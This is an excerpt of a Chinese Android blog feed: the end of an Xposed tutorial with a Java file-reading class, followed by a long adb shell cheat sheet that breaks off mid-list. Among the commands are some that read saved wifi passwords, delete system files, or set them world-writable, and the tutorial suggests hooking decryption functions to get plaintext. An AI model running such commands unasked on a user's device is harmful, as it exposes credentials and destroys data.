<h2 id="xposed进程读取文件">xposed进程读取文件</h2><p>&#160;&#160;&#160;&#160;有时候需要xposed进程根据我们自身进程的设置来执行不同的逻辑功能，因此需要xposed进程读取我们进程的配置文件。xposed框架中提供了读取<code>data/data/package name/shared_prefs</code>目录下的xml配置文件功能类<code>XSharedPreferences</code>，该类继承了系统类<code>SharedPreferences</code>并提供类额外的<code>reload</code>方法，当我们配置文件更新后，可以调用该方法重新加载。</p>
<p>&#160;&#160;&#160;&#160;需要注意的是，该类只支持读操作，如果你尝试去执行写操作会抛异常。至于为什么作者没有添加写权限，作者也给出了详细的解释，详见：<a href="https://github.com/rovo89/XposedBridge/issues/63" target="_blank" rel="external">Cannot Write into a Shared Preferences File</a></p>
<p>&#160;&#160;&#160;&#160;我在使用的过程中，需要读取files目录下的json文件内容，使用时发现该类只能读取xml文件，作为jar导入包又不适合修改，因此仿照XSharedPreferences写了一个可以读取任何文件内容的<code>XFile</code>类，其实可以逐渐完善读更多文件类型的内容，包括数据库等。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.idhyt.xposedExtend;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.json.JSONException;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.SELinuxHelper;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.services.FileResult;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span><br><span class="line"> *</span><br><span class="line"> * Created by idhyt on 2015/12/10.</span><br><span class="line"> *</span><br><span class="line"> * This class is used to read file from data/data/xxx/files directory,</span><br><span class="line"> * same as XSharedPreferences, read-only and without listeners support.</span><br><span class="line"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">XFiles</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String TAG = <span class="string">"XFiles"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> File mFile;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String mFilename;</span><br><span class="line">    <span class="keyword">private</span> ByteArrayOutputStream mFileOutputStream;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> mLoaded = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> mLastModified;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> mFileSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Read settings from the specified file.</span><br><span class="line">     * <span class="doctag">@param</span> file The file to read.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(File file)</span> </span>&#123;</span><br><span class="line">        mFile = file;</span><br><span class="line">        mFilename = mFile.getAbsolutePath();</span><br><span class="line">        startLoadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> packageName The package name.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(String packageName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>(packageName, packageName + <span class="string">"_files"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@param</span> packageName The package name.</span><br><span class="line">     * <span class="doctag">@param</span> fileName The file name with suffix (.txt, .json, etc..)</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">XFiles</span><span class="params">(String packageName, String fileName)</span> </span>&#123;</span><br><span class="line">        mFile = <span class="keyword">new</span> File(Environment.getDataDirectory(), <span class="string">"data/"</span> + packageName + <span class="string">"/files/"</span> + fileName);</span><br><span class="line">        mFilename = mFile.getAbsolutePath();</span><br><span class="line">        startLoadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Tries to make the files file world-readable.</span><br><span class="line">     *</span><br><span class="line">     * This will only work if executed as root (e.g. &#123;<span class="doctag">@code</span> initZygote()&#125;) and only if SELinux is disabled.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@return</span> &#123;<span class="doctag">@code</span> true&#125; in case the file could be made world-readable.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">makeWorldReadable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!SELinuxHelper.getAppDataFileService().hasDirectFileAccess())</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; <span class="comment">// It doesn't make much sense to make the file readable if we wouldn't be able to access it anyway.</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!mFile.exists()) <span class="comment">// Just in case - the file should never be created if it doesn't exist.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mFile.setReadable(<span class="keyword">true</span>, <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Returns the file that is backing these preferences.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; The file might not be accessible directly.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> File <span class="title">getFile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> mFile;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">startLoadFromDisk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            mLoaded = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="string">"XFiles-load"</span>) &#123;</span><br><span class="line">            <span class="annotation">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (XFiles.<span class="keyword">this</span>) &#123;</span><br><span class="line">                    loadFromDiskLocked();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;.start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="annotation">@SuppressWarnings</span>(&#123; <span class="string">"rawtypes"</span>, <span class="string">"unchecked"</span> &#125;)</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loadFromDiskLocked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (mLoaded) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream fileOutputStream = <span class="keyword">null</span>;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        FileResult fileResult = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fileResult = SELinuxHelper.getAppDataFileService().getFileInputStream(mFilename, mFileSize, mLastModified);</span><br><span class="line">            InputStream inputStream = fileResult.stream;</span><br><span class="line">            <span class="keyword">if</span> (inputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> length = inputStream.available();</span><br><span class="line">                <span class="keyword">byte</span> [] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">int</span> readLength;</span><br><span class="line">                <span class="keyword">while</span> ((readLength = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    byteArrayOutputStream.write(buffer, <span class="number">0</span>, readLength);</span><br><span class="line">                &#125;</span><br><span class="line">                fileOutputStream = byteArrayOutputStream;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException ignored) &#123;</span><br><span class="line">            <span class="comment">// SharedPreferencesImpl has a canRead() check, so it doesn't log anything in case the file doesn't exist</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">"getSharedPreferences"</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (fileResult != <span class="keyword">null</span> &amp;&amp; fileResult.stream != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fileResult.stream.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (RuntimeException rethrown) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> rethrown;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mLoaded = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (fileOutputStream != <span class="keyword">null</span>) &#123;</span><br><span class="line">            mFileOutputStream = fileOutputStream;</span><br><span class="line">            mLastModified = fileResult.mtime;</span><br><span class="line">            mFileSize = fileResult.size;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            mFileOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        &#125;</span><br><span class="line">        notifyAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Reload the settings from file if they have changed.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; With enforcing SELinux, this call might be quite expensive.</span><br><span class="line">     *</span><br><span class="line">     * <span class="doctag">@return</span> true if execute reload;</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">reload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hasFileChanged()) &#123;</span><br><span class="line">            startLoadFromDisk();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span><br><span class="line">     * Check whether the file has changed since the last time it has been loaded.</span><br><span class="line">     *</span><br><span class="line">     * &lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; With enforcing SELinux, this call might be quite expensive.</span><br><span class="line">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">boolean</span> <span class="title">hasFileChanged</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileResult result = SELinuxHelper.getAppDataFileService().statFile(mFilename);</span><br><span class="line">            <span class="keyword">return</span> mLastModified != result.mtime || mFileSize != result.size;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException ignored) &#123;</span><br><span class="line">            <span class="comment">// SharedPreferencesImpl doesn't log anything in case the file doesn't exist</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            Log.w(TAG, <span class="string">"hasFileChanged"</span>, e);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">awaitLoadedLocked</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (!mLoaded) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                wait();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException unused) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getFileContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">            awaitLoadedLocked();</span><br><span class="line">            <span class="keyword">return</span> mFileOutputStream.toString();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> JSONObject <span class="title">getJsonFileContent</span><span class="params">()</span> <span class="keyword">throws</span> JSONException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> JSONObject(getFileContent());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="判断xposed框架是否生效">判断xposed框架是否生效</h2><p>&#160;&#160;&#160;&#160;正如上边所说，xposed框架中对文件只有读权限，因此获取信息就变成了单项了，xposed进程只能根据我们的配置文件进行相应的逻辑操作。由于应用进程和xposed进程是不同的进程，如果应用进程要判断xposed框架是否启用，就需要进程间数据通信，如果仅仅只是判断xposed是否启动而去启动一个服务处理数据，感觉有点小题大做了。这里给出一种简单有效的方法。</p>
<blockquote>
<p>1.首先我们生成一个配置文件<code>setting.xml</code><br>2.定义一个函数</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setXposedStatus</span><span class="params">(<span class="keyword">boolean</span> bStatus)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.getSharedPreferences(<span class="string">"setting"</span>, Context.MODE_WORLD_READABLE).edit().putBoolean(<span class="string">"xposed_enabled"</span>, bStatus).apply();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>3.应用每次启动时候调用函数<code>setXposedStatus</code><br>4.在xposed中hook函数<code>setXposedStatus</code>调用前，并将参数改为<code>true</code></p>
</blockquote>
<p>这样我们要想知道xposed框架是否生效可用，读取<code>setting.xml</code>中<code>xposed_enabled</code>字段值即可。</p>
<h2 id="总结">总结</h2><p>&#160;&#160;&#160;&#160;xposed框架不仅能够hook任意你想hook的函数，并且自身也有一个很大的特点，就是一旦用户安装并启用，你所有的操作都不需要任何权限就可实现。基于xposed框架的优秀应用也特别多，比如著名的省电应用<code>绿色守护</code>。再如有一些app对敏感数据进行加密，加密算法又很复杂，那么通过hook解密函数就可以轻松的拿到明文。xposed框架的奇妙之处远远不仅于此，国外也有人对其进行二次封装作出了更神奇的用法，例如<a href="https://github.com/seebye/XClasses" target="_blank" rel="external">XClasses</a>，如果你有什么奇淫技巧，我只想对你说四个字，请带上我！</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>&#160;&#160;&#160;&#160;之前<a href="http://blog.idhyt.com/2015/09/25/android-injection-xposed/">安卓注入框架Xposed分析与简单应用</a>只是简单的了解了一下xposed框架，]]>
    </summary>
    
      <category term="xposed" scheme="http://blog.idhyt.com/tags/xposed/"/>
    
      <category term="android" scheme="http://blog.idhyt.com/categories/android/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[adb shell常用命令]]></title>
    <link href="http://blog.idhyt.com/2015/10/31/android-adb-shell-command/"/>
    <id>http://blog.idhyt.com/2015/10/31/android-adb-shell-command/</id>
    <published>2015-10-31T03:45:11.000Z</published>
    <updated>2016-05-09T13:54:03.000Z</updated>
    <content type="html"><![CDATA[<ul>
<li><p>获取编译时间<br><code>cat /proc/version</code></p>
</li>
<li><p>内核崩溃<br><code>cat /proc/last_kmsg</code></p>
</li>
<li><p>获取硬件信息<br><code>adb shell getprop | grep cpu</code></p>
</li>
<li><p>获取序列号：<br><code>adb get-serialno</code></p>
</li>
<li><p>查看连接计算机的设备：<br><code>adb devices</code></p>
</li>
<li><p>查看模拟器/设施的当前状态:<br><code>adb get-state</code></p>
</li>
<li><p>多设备下连接目标设备：<br><code>adb -s xxx shell</code></p>
</li>
<li><p>重启机器：<br><code>adb reboot</code></p>
</li>
<li><p>重启到bootloader，即刷机模式：<br><code>adb reboot bootloader</code></p>
</li>
<li><p>重启到recovery，即恢复模式：<br><code>adb reboot recovery</code></p>
</li>
<li><p>查看log：<br><code>adb logcat</code></p>
</li>
<li><p>终止adb服务进程：<br><code>adb kill-server</code></p>
</li>
<li><p>重启adb服务进程：<br><code>adb start-server</code></p>
</li>
<li><p>查看Service列表<br><code>adb shell service list</code><br><code>adb shell dumpsys activity services</code></p>
</li>
</ul>
<ul>
<li><p>检查Service是否存在<br><code>adb shell service check phone</code></p>
</li>
<li><p>获取机器MAC地址：<br><code>adb shell  cat /sys/class/net/wlan0/address</code></p>
</li>
<li><p>获取CPU序列号：<br><code>adb shell cat /proc/cpuinfo</code></p>
</li>
<li><p>安装APK：<br><code>adb install &lt;apkfile&gt; //比如：adb install baidu.apk</code></p>
</li>
<li><p>保留数据和缓存文件，重新安装apk：<br><code>adb install -r &lt;apkfile&gt; //比如：adb install -r baidu.apk</code></p>
</li>
<li><p>安装apk到sd卡：<br><code>adb install -s &lt;apkfile&gt; // 比如：adb install -s baidu.apk</code></p>
</li>
<li><p>卸载APK：<br><code>adb uninstall &lt;package&gt; //比如：adb uninstall com.baidu.search</code></p>
</li>
<li><p>卸载app但保留数据和缓存文件：<br><code>adb uninstall -k &lt;package&gt; //比如：adb uninstall -k com.baidu.search</code></p>
</li>
<li><p>启动应用：<br><code>adb shell am start -n &lt;package_name&gt;/.&lt;activity_class_name&gt;</code></p>
</li>
<li><p>查看数据库：<br><code>adb shell content query --uri  content://settings/secure</code></p>
</li>
<li><p>查看设备cpu和内存占用情况：<br><code>adb shell top</code></p>
</li>
<li><p>查看占用内存前6的app：<br><code>adb shell top -m 6</code></p>
</li>
<li><p>刷新一次内存信息，然后返回：<br><code>adb shell top -n 1</code></p>
</li>
<li><p>查询各进程内存使用情况：<br><code>adb shell procrank</code></p>
</li>
<li><p>启动应用程序:<br><code>adb shell am</code></p>
</li>
<li><p>杀死一个进程：<br><code>adb shell kill [pid]</code></p>
</li>
<li><p>查看进程列表：<br><code>adb shell ps</code></p>
</li>
<li><p>查看Android系统的属性<br><code>adb shell prop</code></p>
</li>
<li><p>查看指定进程状态：<br><code>adb shell ps -x [PID]</code></p>
</li>
<li><p>查看后台services信息：<br><code>adb shell service list</code></p>
</li>
<li><p>adb 查看最上层成activity名字：</p>
<blockquote>
<p>linux:<br><code>adb shell dumpsys activity | grep &quot;mFocusedActivity&quot;</code><br>windows:<br><code>adb shell dumpsys activity | findstr &quot;mFocusedActivity&quot;</code></p>
</blockquote>
</li>
<li><p>查看当前内存占用：<br><code>adb shell cat /proc/meminfo</code></p>
</li>
<li><p>查看IO内存分区：<br><code>adb shell cat /proc/iomem</code></p>
</li>
<li><p>将system分区重新挂载为可读写分区：<br><code>adb remount</code></p>
</li>
<li><p>从本地复制文件到设备：<br><code>adb push &lt;local&gt; &lt;remote&gt;</code></p>
</li>
<li><p>从设备复制文件到本地：<br><code>adb pull &lt;remote&gt; &lt;local&gt;</code></p>
</li>
<li><p>列出目录下的文件和文件夹，等同于dos中的dir命令：<br><code>adb shell ls</code></p>
</li>
<li><p>进入文件夹，等同于dos中的cd 命令：<br><code>adb shell cd &lt;folder&gt;</code></p>
</li>
<li><p>重命名文件：<br><code>adb shell rename path/oldfilename path/newfilename</code> </p>
</li>
<li><p>删除system/avi.apk：<br><code>adb shell rm /system/avi.apk</code></p>
</li>
<li><p>删除文件夹及其下面所有文件：<br><code>adb shell rm -r &lt;folder&gt;</code> </p>
</li>
<li><p>移动文件：<br><code>adb shell mv path/file newpath/file</code></p>
</li>
<li><p>设置文件权限：<br><code>adb shell chmod 777 /system/fonts/DroidSansFallback.ttf</code></p>
</li>
<li><p>新建文件夹：<br><code>adb shell mkdir path/foldelname</code></p>
</li>
<li><p>查看文件内容：<br><code>adb shell cat &lt;file&gt;</code> </p>
</li>
<li><p>查看wifi密码：<br><code>adb shell cat /data/misc/wifi/*.conf</code> </p>
</li>
<li><p>清除log缓存：<br><code>adb logcat -c</code></p>
</li>
<li><p>查看bug报告：<br><code>adb bugreport</code></p>
</li>
<li><p>获取设备名称：<br><code>adb shell cat /system/build.prop</code></p>
</li>
<li><p>查看ADB帮助：<br><code>adb help</code></p>
</li>
<li><p>跑monkey：<br><code>adb shell monkey -v -p your.package.name 500</code></p>
</li>
<li><p>dump堆栈：<br><code>debuggerd -b &lt;pid&gt;</code></p>
</li>
<li><p>备份与恢复:</p>
<blockquote>
<p>备份：<br><code>adb backup -f c:\allowBackup.ab -noapk com.ijinshan.browser_fast</code><br>恢复：<br><code>adb restore &quot;c:\allowBackup.ab&quot;</code></p>
</blockquote>
</li>
<li><p>拷贝文件(这些命令都是在adb下用，而不是在shell中用):</p>
<blockquote>
<p>push从电脑端向手机复制文件:<br><code>adb push d:/adb/test.txt /data/data/download/</code><br>pull从手机端向本地复制文件:<br><code>adb pull /data/data/download/ d:/adb/</code></p>
</blockquote>
</li>
<li><p>查看应用程序内存使用情况:<br><code>adb shell dumpsys meminfo &lt;package_name&gt;</code></p>
<blockquote>
<p>其中，package_name 也可以换成程序的pid,<br>pid可以通过 <code>adb shell top | grep app_name</code> 来查找.<br>内存使用情况参考<code>http://blog.csdn.net/bigconvience/article/details/35553983</code></p>
</blockquote>
</li>
<li><p>查看进程占用cpu的情况:<br><code>adb shell top -n 1 -d 0.5 | grep proc_ id</code></p>
</li>
<li><p>procrank查看内存占用：<br><code>adb shell procrank</code></p>
<blockquote>
<p>VSS - Virtual Set Size 虚拟耗用内存（包含共享库占用的内存）<br>RSS - Resident Set Size 实际使用物理内存（包含共享库占用的内存）<br>PSS - Proportional Set Size 实际使用的物理内存（比例分配共享库占用的内存）<br>USS - Unique Set Size 进程独自占用的物理内存（不包含共享库占用的内存）</p>
</blockquote>
</li>
</ul>
<ul>
<li><p>快速查看apk内androidmanifest文件内容:<br><code>aapt dump xmltree xxxx.apk AndroidManifest.xml</code></p>
</li>
<li><p>列出一些系统信息和所有应用的信息:<br><code>adb shell dumpsys packages &gt; d:\\packages.txt</code></p>
</li>
<li><p>列出一些指定应用的信息:<br><code>adb shell dumpsys package com.ijinshan.duba &gt; d:\\duba.txt</code></p>
</li>
<li><p>查看当前谁持有WAKE_LOCK锁对象：<br><code>adb shell dumpsys power</code></p>
</li>
<li><p>查看电池用量详情：<br><code>adb shell dumpsys batteryinfo</code></p>
</li>
<li><p>搜索文件：<br><code>busybox find -name *xxx*</code></p>
</li>
<li><p>电池日志：<br><code>adb shell dumpsys batterystats &gt; x:\batterystats.txt</code><br><code>bugreport日志：adb bugreport &gt; x:\bugreport.txt</code></p>
</li>
<li><p>电池日志图形界面查看<br><code>https://github.com/cacker/battery-historian</code></p>
</li>
<li><p>查看应用uid<br><code>cat /proc/&lt;pid&gt;/status</code><br><code>cat /data/system/packages.list | grep xxx</code></p>
</li>
<li><p>cpu频率<br>查看：<br><code>cat [%cpuFreqPath%]/cpuinfo_cur_freq (当前cpu频率)</code><br>修改：<br><code>echo xxx &gt; /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor</code></p>
<blockquote>
